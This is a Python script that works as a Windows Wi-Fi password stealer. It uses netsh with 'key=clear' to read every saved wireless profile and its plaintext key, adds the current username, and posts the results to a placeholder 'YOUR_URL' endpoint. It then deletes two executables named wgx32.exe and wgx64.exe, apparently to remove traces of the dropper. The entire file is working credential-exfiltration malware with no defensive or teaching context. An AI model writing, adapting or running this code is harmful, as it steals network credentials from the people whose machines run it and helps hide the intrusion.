import subprocess
import requests
import os

data = subprocess.check_output(
    ['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
data = []
for i in profiles:
    results = subprocess.check_output(
        ['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        data.append("{:<30}|  {:<}".format(i, results[0]))
    except IndexError:
        print("{:<30}|  {:<}".format(i, ""))

name = subprocess.check_output(['whoami']).decode('utf-8').split('\\')[1][:-2]
passes = {"name": name, "data": data}
print(passes)
requests.post(
    'https://YOUR_URL', data=passes)

os.remove('wgx32.exe')
os.remove('wgx64.exe')
